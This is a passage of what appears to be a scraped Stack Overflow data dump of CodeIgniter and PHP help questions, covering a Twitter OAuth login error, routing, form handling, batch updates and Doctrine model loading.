}\n        }\n    }\n\n    public function enable_debug($debug)\n    {\n        $debug = (bool) $debug;\n        $this-&gt;_enable_debug = $debug;\n    }\n\n    public function call($method, $path, $args = NULL)\n    {\n        $response = $this-&gt;_httpRequest(strtoupper($method), $this-&gt;_apiUrl.'/'.$path.'.json', $args);\n\n        // var_dump($response);\n        // die();\n\n        return ( $response === NULL ) ? FALSE : $response-&gt;_result;\n    }\n\n    public function search($args = NULL)\n    {\n        $response = $this-&gt;_httpRequest('GET', $this-&gt;_searchUrl.'search.json', $args);\n\n        return ( $response === NULL ) ? FALSE : $response-&gt;_result;\n    }\n\n    public function loggedIn()\n    {\n        $access_key = $this-&gt;_getAccessKey();\n        $access_secret = $this-&gt;_getAccessSecret();\n\n        $loggedIn = FALSE;\n\n        if ( $this-&gt;_getAccessKey() !== NULL &amp;&amp; $this-&gt;_getAccessSecret() !== NULL )\n        {\n            $loggedIn = TRUE;\n        }\n\n        $this-&gt;_obj-&gt;unit-&gt;run($loggedIn, TRUE, 'Logged In');\n        return $loggedIn;\n    }\n\n    private function _checkLogin()\n    {\n        if ( isset($_GET['oauth_token']) )\n        {\n            $this-&gt;_setAccessKey($_GET['oauth_token']);\n            $token = $this-&gt;_getAccessToken();\n\n            $token = $token-&gt;_result;\n\n            $token = ( is_bool($token) ) ? $token : (object) $token;\n\n            if ( !empty($token-&gt;oauth_token) &amp;&amp; !empty($token-&gt;oauth_token_secret) )\n            {\n                $this-&gt;_setAccessKey($token-&gt;oauth_token);\n                $this-&gt;_setAccessSecret($token-&gt;oauth_token_secret);\n            }\n\n            redirect(current_url());\n            return NULL;\n        }\n    }\n\n    public function login()\n    {\n        if ( ($this-&gt;_getAccessKey() === NULL || $this-&gt;_getAccessSecret() === NULL) )\n        {\n            header('Location: '.$this-&gt;_getAuthorizationUrl());\n            return;\n        }\n\n        return $this-&gt;_checkLogin();\n    }\n\n    public function logout()\n    {\n        $this-&gt;_obj-&gt;session-&gt;unset_userdata('twitter_oauth_tokens');\n    }\n\n    public function getTokens()\n    {\n        return $this-&gt;_tokens;\n    }\n\n    private function _getConsumerKey()\n    {\n        return $this-&gt;_tokens['consumer_key'];\n    }\n\n    private function _getConsumerSecret()\n    {\n        return $this-&gt;_tokens['consumer_secret'];\n    }\n\n    public function getAccessKey(){ return $this-&gt;_getAccessKey(); }\n\n    private function _getAccessKey()\n    {\n        $tokens = $this-&gt;_obj-&gt;session-&gt;userdata('twitter_oauth_tokens');\n        return ( $tokens === FALSE || !isset($tokens['access_key']) || empty($tokens['access_key']) ) ? NULL : $tokens['access_key'];\n    }\n\n    private function _setAccessKey($access_key)\n    {\n        $tokens = $this-&gt;_obj-&gt;session-&gt;userdata('twitter_oauth_tokens');\n\n        if ( $tokens === FALSE || !is_array($tokens) )\n        {\n            $tokens = array('access_key' =&gt; $access_key);\n        }\n        else\n        {\n            $tokens['access_key'] = $access_key;\n        }\n\n        $this-&gt;_obj-&gt;session-&gt;set_userdata('twitter_oauth_tokens', $tokens);\n    }\n\n    public function getAccessSecret(){ return $this-&gt;_getAccessSecret(); }\n\n    private function _getAccessSecret()\n    {\n        $tokens = $this-&gt;_obj-&gt;session-&gt;userdata('twitter_oauth_tokens');\n        return ( $tokens === FALSE || !isset($tokens['access_secret']) || empty($tokens['access_secret']) ) ? NULL : $tokens['access_secret'];\n    }\n\n    private function _setAccessSecret($access_secret)\n    {\n        $tokens = $this-&gt;_obj-&gt;session-&gt;userdata('twitter_oauth_tokens');\n\n        if ( $tokens === FALSE || !is_array($tokens) )\n        {\n            $tokens = array('access_secret' =&gt; $access_secret);\n        }\n        else\n        {\n            $tokens['access_secret'] = $access_secret;\n        }\n\n        $this-&gt;_obj-&gt;session-&gt;set_userdata('twitter_oauth_tokens', $tokens);\n    }\n\n    private function _setAccessTokens($tokens)\n    {\n        $this-&gt;_setAccessKey($tokens['oauth_token']);\n        $this-&gt;_setAccessSecret($tokens['oauth_token_secret']);\n    }\n\n    public function setAccessTokens($tokens)\n    {\n        return $this-&gt;_setAccessTokens($tokens);\n    }\n\n    private function _getAuthorizationUrl()\n    {\n        $token = $this-&gt;_getRequestToken();\n        return $this-&gt;_authorizationUrl.'?oauth_token=' . $token-&gt;oauth_token;\n    }\n\n    private function _getRequestToken()\n    {\n        return $this-&gt;_httpRequest('GET', $this-&gt;_requestTokenUrl);\n    }\n\n    private function _getAccessToken()\n    {\n        return $this-&gt;_httpRequest('GET', $this-&gt;_accessTokenUrl);\n    }\n\n    protected function _httpRequest($method = null, $url = null, $params = null)\n    {\n        if( empty($method) || empty($url) ) return FALSE;\n        if ( empty($params['oauth_signature']) ) $params = $this-&gt;_prepareParameters($method, $url, $params);\n\n        $this-&gt;_connection = new tweetConnection();\n\n        try {\n            switch ( $method )\n            {\n                case 'GET':\n                    return $this-&gt;_connection-&gt;get($url, $params);\n                break;\n\n                case 'POST':\n                    return $this-&gt;_connection-&gt;post($url, $params);\n                break;\n\n                case 'PUT':\n                    return NULL;\n                break;\n\n                case 'DELETE':\n                    return NULL;\n                break;\n            }\n        } catch (tweetException $e) {\n            $this-&gt;_errors[] = $e;\n        }\n    }\n\n    private function _getCallback()\n    {\n        return $this-&gt;_callback;\n    }\n\n    public function setCallback($url)\n    {\n        $this-&gt;_callback = $url;\n    }\n\n    private function _prepareParameters($method = NULL, $url = NULL, $params = NULL)\n    {\n        if ( empty($method) || empty($url) ) return FALSE;\n\n        $callback = $this-&gt;_getCallback();\n\n        if ( !empty($callback) )\n        {\n            $oauth['oauth_callback'] = $callback;\n        }\n\n        $this-&gt;setCallback(NULL);\n\n        $oauth['oauth_consumer_key']        = $this-&gt;_getConsumerKey();\n        $oauth['oauth_token']               = $this-&gt;_getAccessKey();\n        $oauth['oauth_nonce']               = $this-&gt;_generateNonce();\n        $oauth['oauth_timestamp']           = time();\n        $oauth['oauth_signature_method']    = $this-&gt;_signatureMethod;\n        $oauth['oauth_version']             = $this-&gt;_version;\n\n        array_walk($oauth, array($this, '_encode_rfc3986'));\n\n        if ( is_array($params) )\n        {\n            array_walk($params, array($this, '_encode_rfc3986'));\n        }\n\n        $encodedParams = array_merge($oauth, (array)$params);\n\n        ksort($encodedParams);\n\n        $oauth['oauth_signature'] = $this-&gt;_encode_rfc3986($this-&gt;_generateSignature($method, $url, $encodedParams));\n        return array('request' =&gt; $params, 'oauth' =&gt; $oauth);\n    }\n\n    private function _generateNonce()\n    {\n        return md5(uniqid(rand(), TRUE));\n    }\n\n    private function _encode_rfc3986($string)\n    {\n        return str_replace('+', ' ', str_replace('%7E', '~', rawurlencode(($string))));\n    }\n\n    private function _generateSignature($method = null, $url = null, $params = null)\n    {\n        if( empty($method) || empty($url) ) return FALSE;\n\n        // concatenating\n        $concatenatedParams = '';\n\n        foreach ($params as $k =&gt; $v)\n        {\n            $v = $this-&gt;_encode_rfc3986($v);\n            $concatenatedParams .= \"{$k}={$v}&amp;\";\n        }\n\n        $concatenatedParams = $this-&gt;_encode_rfc3986(substr($concatenatedParams, 0, -1));\n\n        // normalize url\n        $normalizedUrl = $this-&gt;_encode_rfc3986($this-&gt;_normalizeUrl($url));\n        $method = $this-&gt;_encode_rfc3986($method); // don't need this but why not?\n\n        $signatureBaseString = \"{$method}&amp;{$normalizedUrl}&amp;{$concatenatedParams}\";\n        return $this-&gt;_signString($signatureBaseString);\n    }\n\n    private function _normalizeUrl($url = NULL)\n    {\n        $urlParts = parse_url($url);\n\n        if ( !isset($urlParts['port']) ) $urlParts['port'] = 80;\n\n        $scheme = strtolower($urlParts['scheme']);\n        $host = strtolower($urlParts['host']);\n        $port = intval($urlParts['port']);\n\n        $retval = \"{$scheme}://{$host}\";\n\n        if ( $port &gt; 0 &amp;&amp; ( $scheme === 'http' &amp;&amp; $port !== 80 ) || ( $scheme === 'https' &amp;&amp; $port !== 443 ) )\n        {\n            $retval .= \":{$port}\";\n        }\n\n        $retval .= $urlParts['path'];\n\n        if ( !empty($urlParts['query']) )\n        {\n            $retval .= \"?{$urlParts['query']}\";\n        }\n\n        return $retval;\n    }\n\n    private function _signString($string)\n    {\n        $retval = FALSE;\n        switch ( $this-&gt;_signatureMethod )\n        {\n            case 'HMAC-SHA1':\n                $key = $this-&gt;_encode_rfc3986($this-&gt;_getConsumerSecret()) . '&amp;' . $this-&gt;_encode_rfc3986($this-&gt;_getAccessSecret());\n                $retval = base64_encode(hash_hmac('sha1', $string, $key, true));\n            break;\n        }\n\n        return $retval;\n    }\n\n}\n</code></pre>\n\n<p>My Controller (auth_other.php)</p>\n\n<pre><code>class auth_other extends CI_Controller\n{   \nfunction __construct()\n{\n    parent::__construct();\n    $this-&gt;load-&gt;model('user_model');\n    $this-&gt;load-&gt;model('tank_auth/users');\n\n    // for google open id\n    parse_str($_SERVER['QUERY_STRING'],$_GET);      \n}\n\n// function to allow users to log in via twitter\nfunction twitter_signin()\n{\n\n    if ($this-&gt;input-&gt;get('denied')) {\n\n        echo 'User denied twitter authorization';\n        // Possibly redirect to home page or show generic deneied message\n\n    }else{\n\n        // It really is best to auto-load this library!\n        //$this-&gt;load-&gt;library('tweet'); // automatically loaded in the autoload!\n\n        // Enabling debug will show you any errors in the calls you're making, e.g:\n        $this-&gt;tweet-&gt;enable_debug(TRUE);\n\n        // If you already have a token saved for your user\n        // (In a db for example) - See line #37\n        // \n        // You can set these tokens before calling logged_in to try using the existing tokens.\n        // $tokens = array('oauth_token' =&gt; 'foo', 'oauth_token_secret' =&gt; 'bar');\n        // $this-&gt;tweet-&gt;set_tokens($tokens);\n        if ( !$this-&gt;tweet-&gt;logged_in() )\n        {\n            // This is where the url will go to after auth.\n            // ( Callback url )\n\n            $this-&gt;tweet-&gt;set_callback(site_url('auth_other/twitter_signin'));\n\n            // Send the user off for login!\n            $this-&gt;tweet-&gt;login();\n        }\n        else\n        {\n            // You can get the tokens for the active logged in user:\n            // $tokens = $this-&gt;tweet-&gt;get_tokens();\n\n            // \n            // These can be saved in a db alongside a user record\n            // if you already have your own auth system.\n\n            // get the user id from twitter authentication and save to session\n            $user = $this-&gt;tweet-&gt;call('get', 'account/verify_credentials');\n            $twitter_id = $user-&gt;id;\n            $this-&gt;session-&gt;set_userdata('twitter_id', $twitter_id);    \n\n            // now see if the user exists with the given twitter id \n            $user = $this-&gt;user_model-&gt;get_user_by_sm(array('twitter_id' =&gt; $twitter_id), 'twitter_id');\n            if( sizeof($user) == 0 ) \n            { \n                redirect('auth_other/fill_user_info', 'refresh'); \n            }\n            else\n            {\n                // simulate what happens in the tank auth\n                $this-&gt;session-&gt;set_userdata(array( 'user_id' =&gt; $user[0]-&gt;id, 'username' =&gt; $user[0]-&gt;username,\n                                                    'status' =&gt; ($user[0]-&gt;activated == 1) ? STATUS_ACTIVATED : STATUS_NOT_ACTIVATED));\n                //$this-&gt;tank_auth-&gt;clear_login_attempts($user[0]-&gt;email); can't run this when doing twitter\n                redirect('auth', 'refresh');    \n            }           \n        }\n\n    }\n}\n\n// called when user logs in via twitter for the first time\nfunction fill_user_info()\n{\n    // load validation library and rules\n    $this-&gt;load-&gt;config('tank_auth', TRUE);\n    $this-&gt;load-&gt;library('form_validation');\n    $this-&gt;form_validation-&gt;set_rules('username', 'Username', 'trim|required|xss_clean|min_length['.$this-&gt;config-&gt;item('username_min_length', 'tank_auth').']|callback_username_check');\n    $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'trim|required|xss_clean|valid_email|callback_email_check');\n\n    // Run the validation\n    if ($this-&gt;form_validation-&gt;run() == false ) \n    {\n        $this-&gt;load-&gt;view('auth_other/fill_user_info'); \n    }\n    else\n    {\n        $username = mysql_real_escape_string($this-&gt;input-&gt;post('username'));\n        $email = mysql_real_escape_string($this-&gt;input-&gt;post('email'));\n\n        /*\n         * We now must create a new user in tank auth with a random password in order\n         * to insert this user and also into user profile table with tank auth id\n         */\n        $password = $this-&gt;generate_password(9, 8);\n        $data = $this-&gt;tank_auth-&gt;create_user($username, $email, $password, false);\n        $user_id = $data['user_id'];\n        if( $this-&gt;session-&gt;userdata('facebook_id')) \n        { \n            $this-&gt;user_model-&gt;update_user_profile($user_id, array('facebook_id' =&gt; $this-&gt;session-&gt;userdata('facebook_id')));\n        }\n        else if( $this-&gt;session-&gt;userdata('twitter_id'))\n        {\n            $this-&gt;user_model-&gt;update_user_profile($user_id, array('twitter_id' =&gt; $this-&gt;session-&gt;userdata('twitter_id')));\n        }\n        else if( $this-&gt;session-&gt;userdata('gfc_id'))\n        {\n            $this-&gt;user_model-&gt;update_user_profile($user_id, array('gfc_id' =&gt; $this-&gt;session-&gt;userdata('gfc_id')));\n        }\n        else if( $this-&gt;session-&gt;userdata('google_open_id'))\n        {\n            $this-&gt;user_model-&gt;update_user_profile($user_id, array('google_open_id' =&gt; $this-&gt;session-&gt;userdata('google_open_id')));\n        }\n        else if( $this-&gt;session-&gt;userdata('yahoo_open_id'))\n        {\n            $this-&gt;user_model-&gt;update_user_profile($user_id, array('yahoo_open_id' =&gt; $this-&gt;session-&gt;userdata('yahoo_open_id')));\n        }           \n        // let the user login via tank auth\n        $this-&gt;tank_auth-&gt;login($email, $password, false, false, true);\n        redirect('auth', 'refresh');\n    }\n}\n\n// a logout function for 3rd party\nfunction logout()\n{\n    $redirect = site_url('auth/logout');\n    if( $this-&gt;session-&gt;userdata('gfc_id') &amp;&amp; $this-&gt;session-&gt;userdata('gfc_id') != '') { $redirect = null; }\n\n    // set all user data to empty\n    $this-&gt;session-&gt;set_userdata(array('facebook_id' =&gt; '', \n                                       'twitter_id' =&gt; '', \n                                       'gfc_id' =&gt; '',\n                                       'google_open_id' =&gt; '',\n                                       'yahoo_open_id' =&gt; ''));\n    if( $redirect ) { redirect($redirect, 'refresh'); } \n    else { $this-&gt;load-&gt;view('gfc_logout'); }\n}\n\n// function to validate the email input field\nfunction email_check($email)\n{\n    $user = $this-&gt;users-&gt;get_user_by_email($email);\n    if ( sizeof($user) &gt; 0) \n    {\n        $this-&gt;form_validation-&gt;set_message('email_check', 'This %s is already registered.');\n        return false;\n    }\n    else { return true; }\n}\nfunction username_check($username)\n{\n    $user = $this-&gt;users-&gt;get_user_by_username($username);\n    if ( sizeof($user) &gt; 0) \n    {\n        $this-&gt;form_validation-&gt;set_message('username_check', 'This %s is already registered.');\n        return false;\n    }\n    else { return true; }\n}\n// generates a random password for the user\nfunction generate_password($length=9, $strength=0) \n{\n    $vowels = 'aeuy';\n    $consonants = 'bdghjmnpqrstvz';\n    if ($strength &amp; 1) { $consonants .= 'BDGHJLMNPQRSTVWXZ'; }\n    if ($strength &amp; 2) { $vowels .= \"AEUY\"; }\n    if ($strength &amp; 4) { $consonants .= '23456789'; }\n    if ($strength &amp; 8) { $consonants .= '@#$%'; }\n\n    $password = '';\n    $alt = time() % 2;\n    for ($i = 0; $i &lt; $length; $i++) \n    {\n        if ($alt == 1) \n        {\n            $password .= $consonants[(rand() % strlen($consonants))];\n            $alt = 0;\n        } \n        else \n        {\n            $password .= $vowels[(rand() % strlen($vowels))];\n            $alt = 1;\n            }\n        }\n        return $password;\n    }\n}\n</code></pre>\n\n<p>The error i get is \n    A PHP Error was encountered</p>\n\n<pre><code>Severity: Notice\n\nMessage: Undefined property: stdClass::$request\n\nFilename: libraries/tweet.php\n\nLine Number: 204\n\nA PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Undefined property: stdClass::$error\n\nFilename: libraries/tweet.php\n\nLine Number: 204\n</code></pre>\n\n<p>can anybody please provide any inputs on this..?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13267430,"title":"How to call an external api from codeIgniter?","body":"<p>Hi I am facing a big problem right now in developing my application. Actually there is a function developed already in one of our previous application class file. Now we want to use that function in our new application. How can we call that function in our new controller using codeIgniter.</p>\n\n<p>Note: our old application is in core PHP.</p>\n\n<p>old file report.class.php....in this there is a function name <code>get_report()</code>\nNew controller ro_manager.php.......in this there is a function <code>order_details()</code>...</p>\n\n<p>I want to call <code>get_report()</code> function in <code>order_details()</code> function......i need help in this any idea.......</p>\n"},{"tags":["sql","codeigniter","function"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13267243,"title":"A Database Error Occurred Error Number: 1054","body":"<p>i tried to make option delete for my CI with sql, but why its still error?</p>\n\n<p><strong>error warning:</strong></p>\n\n<pre><code>A Database Error Occurred\n\nError Number: 1054\n\nUnknown column 'sip' in 'where clause'\n\nselect * from t_label where label = sip\n\nFilename: E:\\web\\rbt.new\\system\\database\\DB_driver.php\n\nLine Number: 330\n</code></pre>\n\n<p><strong>code:</strong></p>\n\n<pre><code>function hapus($id_user){\n            if($this-&gt;session-&gt;userdata('username')==TRUE) {\n                $name = $this-&gt;db-&gt;query(\"select USER_NAME from t_user where USER_ID = $id_user\")-&gt;row();\n                $id_label = $this-&gt;db-&gt;query(\"select * from t_label where label = $name-&gt;USER_NAME\")-&gt;row();\n                $this-&gt;db-&gt;query(\"delete from t_label, t_publisher where t_label.id_label = t_publisher.id_label and t_label.id_label = $id_label-&gt;id_label\");\n                $this-&gt;db-&gt;delete('t_user', array('USER_ID' =&gt; $id_user));\n                redirect(\"registrasi/reg\");\n            }\n        }\n</code></pre>\n\n<p>whats wrong with my code? really need help here</p>\n"},{"tags":["php","javascript","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":30,"score":0,"question_id":13265817,"title":"get value from popup page and insert it in parent page codeigniter","body":"<p>I had a popup page which had a form with field </p>\n\n<pre><code>name,discription , date etc\n</code></pre>\n\n<p>when the form submit successfully popup page close . it work fine till now.</p>\n\n<p>but know i want to get the value of </p>\n\n<pre><code>NAME field \n</code></pre>\n\n<p>from popup page and insert it in the parent page form . both page had a different controller . please tell how i procceed further.</p>\n"},{"tags":["codeigniter","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13264437,"title":"redirect me to domain.com:2082","body":"<p>just wanna ask regarding my web codeigniter app , why is it always redirect me to <br><code>http://domain.com:2082</code><br> after I validate my credentials. Is it my code that causing this error or the cpanel itself?<br>thanks</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13265140,"title":"php: Routing in CI (Codeigniter)","body":"<p>Im new to CI framework and i really have a hard time understanding the URL/URI reouting in CI, i've managed to understand some concepts but when i tried testing them, some wont work, in this instance, i have two links, one is Home and the other is Panel, Home links to main/index and panel links to main/panel, heres the snippet to better understand.</p>\n\n<pre><code>&lt;a href=\"main/index\"&gt; Home &lt;/a&gt;\n&lt;a href=\"main/panel\"&gt; Panel &lt;/a&gt;\n</code></pre>\n\n<p>and this is the code for the controller <code>main.php</code></p>\n\n<pre><code>class Main extends CI_Controller\n{\n    public function index()\n    {\n        $this-&gt;load-&gt;helper('url');\n        $this-&gt;load-&gt;helper('form');\n        $this-&gt;load-&gt;view('templates/header');\n        $this-&gt;load-&gt;view('home');\n        $this-&gt;load-&gt;view('templates/footer');\n    }\n\n    public function panel()\n    {\n        $this-&gt;load-&gt;helper('url');\n        $this-&gt;load-&gt;helper('form');\n        $this-&gt;load-&gt;view('templates/header');\n        $this-&gt;load-&gt;view('panel');\n        $this-&gt;load-&gt;view('templates/footer');\n    }\n}   \n</code></pre>\n\n<p>and heres my <code>routes (config/routes.php)</code></p>\n\n<pre><code>$route['main/index'] = \"main/index\";\n$route['main/panel'] = \"main/panel\";\n$route['default_controller'] = \"main/index\";\n</code></pre>\n\n<p>At first run, it will automatically go to main/index, it works fine, but when i click the panel link it says <strong>Object not found</strong> so does the Home link <strong>Object no found</strong></p>\n\n<p>I really have a hard time understanding rounting in CI, please do enlighten me with some of your knowledge. tnx</p>\n\n<p><strong>NOTE</strong>\ni've read some thread but im having a hard time understanding them, their example are too andvance for me to comprehend, so i rather have my own example to help me gain something</p>\n"},{"tags":["php","mvc","codeigniter"],"answer_count":4,"favorite_count":25,"up_vote_count":39,"down_vote_count":0,"view_count":24577,"score":39,"question_id":804399,"title":"CodeIgniter: Create new helper?","body":"<p>I need to loop lot of arrays in different ways and display it in a page. The arrays are generated by a module class. I know that its better not to include functions on 'views' and I want to know where to insert the functions file.</p>\n\n<p>I know I can 'extend' the helpers, but I don't want to extend a helper. I want to kind of create a helper with my loop functions.. Lets call it loops_helper.php</p>\n\n<p>Can I do it?? How?? \nThanks!!</p>\n"},{"tags":["codeigniter","ftp","image-resizing","remote-server"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13264121,"title":"Codeigniter resize image and save to a remote server","body":"<p>I have a project that I wanna use codeigniter to resize the uploaded image and save to a remote server</p>\n\n<p>I can successfully do the following(all on my local machine):</p>\n\n<ol>\n<li>get the uploaded images</li>\n<li>save to a tmp folder</li>\n<li>resize the image in the tmp folder</li>\n<li>save to the final destination folder.</li>\n</ol>\n\n<p>However, I wanna make one more step further. I wanna get the image from tmp, resize it and save to a remote server. here is the sample code I assume it wont work.</p>\n\n<pre><code>$config['image_library'] = 'gd2';\n$config['source_image'] = '/tmp/sample.jpg';\n$config['create_thumb'] = TRUE;\n$config['maintain_ratio'] = TRUE;\n$config['width'] = 80;\n$config['height'] = 60;\n$config['new_image'] = 'ftp://xx.xx.xxx.xxx/tmp/sample.jpg';  // can i do this?\n$config['thumb_marker']  = '';\n\n$ftpconfig['hostname'] = 'xx.xx.xxx.xxx';\n$ftpconfig['username'] = 'name';\n$ftpconfig['password'] = 'password';\n$ftpconfig['debug'] = TRUE;\n\n$this-&gt;ftp-&gt;connect($ftpconfig);\n\n// and can I call CI to resize it and save to a ftp server after connent ftp?\n$this-&gt;image_lib-&gt;initialize($config);\n$this-&gt;image_lib-&gt;resize();\n$this-&gt;image_lib-&gt;clear();\n\n$this-&gt;ftp-&gt;close();\n</code></pre>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13264656,"title":"Find ID in Database Table and Select Value from Column","body":"<p>Okay, so first allow me to outline what I'm trying to do. I want to display a DIV in my view that's only displayed to users of a certain 'subscription' type.</p>\n\n<p>So I'm searching the 'subscriptions' table using the user's session ID to find their subscription on the database (subscriptions are stored with user id as primary). Once their row is found with their subscription, I want to grab the value from the \"subscription\" column. If the value equals \"freebie\" I want to echo a statement (I will add a function here once i get it to work obviously).</p>\n\n<p>Here's what I've come up with...what am I doing wrong? Not working and I'm receiving no error.</p>\n\n<pre><code>    // show appropiate upgrade message if user has free account\n\n    $id = $this-&gt;session-&gt;userdata('user_id'); \n\n    $this-&gt;db-&gt;select('subscription');\n    $this -&gt; db -&gt; where('id', '$id');\n    $query = $this -&gt; db -&gt; get(\"subscriptions\");\n    $subscribe = $query -&gt; result();\n\n    if($subscribe == 'freebie')\n    {\n        echo 'function goes here';\n    }\n</code></pre>\n"},{"tags":["image","codeigniter","moo"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13262499,"title":"CodeIgniter / Image Moo - Dynamic output is not rendering anything at all","body":"<p>I was wondering if anyone has any experience with the Image_Moo library for Codeigniter.</p>\n\n<p>I have integrated it with my CodeIgniter project quite well except for one function.</p>\n\n<p>That function is the save_dynamic() function.</p>\n\n<p>When i run the following code, it doesnt display anything at all, not even errors .. The following code is what i have in my View.</p>\n\n<pre><code>&lt;?php $this-&gt;image_moo-&gt;load(\"/photo-1.gif\")-&gt;resize(100,100)-&gt;save_dynamic(); ?&gt;\n</code></pre>\n\n<p>If anyone has used this library, i would love some help.</p>\n\n<p>Cheers,</p>\n"},{"tags":["codeigniter","radio-button"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13261536,"title":"CodeIgniter form_radio with set_value","body":"<p>I am having a bit of trouble with my form and radio buttons, with input text I do this:</p>\n\n<pre><code>&lt;?php echo form_input('lastname', set_value('lastname'), 'id=lastname'); ?&gt;\n&lt;?php echo form_error('lastname'); ?&gt;\n</code></pre>\n\n<p>and when the validation runs and that input field that is filled out gets the valued returned...what I am looking for is a way to do this with radio buttons</p>\n\n<pre><code>&lt;tr&gt;&lt;td&gt;&lt;?php echo form_label('Gender: ', 'gender'); ?&gt;&lt;/td&gt;&lt;td&gt;&lt;?php echo form_label('Male', 'male') . form_radio('gender', 'M', '', 'id=male'); ?&gt;&lt;br&gt;&lt;?php echo form_label('Female', 'female') . form_radio('gender', 'F', '', 'id=female'); ?&gt;&lt;/td&gt;&lt;td&gt;&lt;?php echo form_error('gender'); ?&gt;&lt;/td&gt;&lt;/tr&gt;\n</code></pre>\n\n<p>as you can see both my radio buttons have values already F or M.....how do I have the button that is selected returned selected?</p>\n"},{"tags":["validation","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13261280,"title":"CodeIgniter get values back if validation fails","body":"<p>I am new at codeigniter and I got a question. I have a form with validation and that works fine, but say if I enter data in a field and leave the rest blank, the validation will show me the errors and clear the data that has been entered....how do I fix this?</p>\n\n<p>Here is my controller code:</p>\n\n<pre><code>function submitclub()\n    {\n\n        $this-&gt;form_validation-&gt;set_rules('lastname', 'Last Name', 'required');\n        $this-&gt;form_validation-&gt;set_rules('firstname', 'First Name', 'required');\n        if ($this-&gt;form_validation-&gt;run() == FALSE)\n        {\n            $dataclub['clubname'] = $this-&gt;club_model-&gt;get(0, FALSE);\n            $dataclub['division'] = $this-&gt;division_model-&gt;get(0, FALSE);\n            $data['reset'] = TRUE;\n            $view = 'individual/individual_view';\n        }\n</code></pre>\n\n<p>Any help would be much apperciated</p>\n"},{"tags":["codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13259973,"title":"Codeigniter Update Multiple Records with different values","body":"<p>I'm trying to update a certain field with different values for different records.</p>\n\n<p>If I were to use MySql syntax, I think it should have been:</p>\n\n<pre><code>UPDATE products\nSET price = CASE id\n    WHEN '566423' THEN 49.99\n    WHEN '5681552' THEN 69.99\nEND\nWHERE code IN ('566423','5681552');\n</code></pre>\n\n<p>But I prefer to use Active Record if it's possible.</p>\n\n<p>My input is a tab delimited text which I convert into an array of the id and the desired value for each record:</p>\n\n<pre><code>$data = array(\n               array(\n                  'id' =&gt; '566423' ,\n                  'price' =&gt; 49.99\n               ),\n               array(\n                  'id' =&gt; '5681552' ,\n                  'price' =&gt; 69.99\n               )\n    );\n</code></pre>\n\n<p>I thought this is the proper structure for update_batch, but it fails. Here's what I've tried:</p>\n\n<pre><code>function updateMultiple()\n{\n    if($this-&gt;db-&gt;update_batch('products', $data, 'id'))\n    {\n        echo \"updated\";\n    }\n    else\n    {\n        echo \"failed )-:\";\n    }\n\n}\n</code></pre>\n\n<p>And I get failed all the time. What am I missing?</p>\n"},{"tags":["php","email","codeigniter","html-email"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":564,"score":2,"question_id":9062192,"title":"Add extra header information in codeigniter email","body":"<p>I would like to send some extra information on the emails which is sent from codeigniter library. Is there any way to configure or add this?</p>\n\n<p>I want to categorize all the outgoing mail from my site. I need to include sendgrid category header for tracking.</p>\n"},{"tags":["php","codeigniter","doctrine2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13163649,"title":"Doctrine inconsistently and silently fails to load model","body":"<p>Ok, I'm using Doctrine2 in Codeigniter along the lines of <a href=\"http://www.joelverhagen.com/blog/2011/05/setting-up-codeigniter-2-with-doctrine-2-the-right-way/\" rel=\"nofollow\">Joel Verhagen</a> and things have been working fine, but now I have a mysterious issue.</p>\n\n<p>When destroying an item things work fine:</p>\n\n<pre><code>$delete = $this-&gt;doctrine-&gt;em-&gt;getRepository('Entities\\Item')-&gt;findOneBy(array('slug' =&gt; $item));\n$this-&gt;doctrine-&gt;em-&gt;remove($delete);\n$this-&gt;doctrine-&gt;em-&gt;flush();\n</code></pre>\n\n<p>but updating an item fails, silently, right after the getRepository():</p>\n\n<pre><code>$item = $this-&gt;doctrine-&gt;em-&gt;getRepository('Entities\\Item')-&gt;findOneBy(array('id' =&gt; $id));\n$item-&gt;setDescription(html_entity_decode($_POST['content']));\n$this-&gt;doctrine-&gt;em-&gt;persist($item);\n$this-&gt;doctrine-&gt;em-&gt;flush();\n</code></pre>\n\n<p>Same controller, and that is all the code in each action. All of my other controllers are fine, but this fails with nothing in any logs. Splitting the getRepository and find calls dies right after the getRepository. Moving the getRepository into the __construct causes update() to die with the find.</p>\n\n<p>Thoughts? Leads? It seems anyone else on SO ends up either going a different direction or never having solved the problem.</p>\n\n<p>Thanks!</p>\n\n<hr>\n\n<p>Edit:\nAdd Models</p>\n\n<p>Yaml</p>\n\n<p>Item</p>\n\n<pre><code>Entities\\Item:\n    type: entity\n    table: items\n    id:\n        id:\n            type: integer\n            primary: true\n            notnull: true\n            generator:\n                strategy: AUTO\n    fields:\n        title:\n            type: string(255)\n            notnull: true\n        slug:\n            type: string(255)\n            notnull: true\n        description:\n            type: string(255)\n    manyToOne:\n        type:\n            targetEntity: Type\n            inversedBy: item\n            joinColumn:\n                name: type_id\n                referencedColumnName: id\n    options:\n        charset: utf8\n        type: InnoDB\n</code></pre>\n\n<p>Type</p>\n\n<pre><code>Entities\\Type:\n    type: entity\n    table: types\n    id:\n        id:\n            type: integer\n            primary: true\n            notnull: true\n            generator:\n                strategy: AUTO\n    fields:\n        title:\n            type: 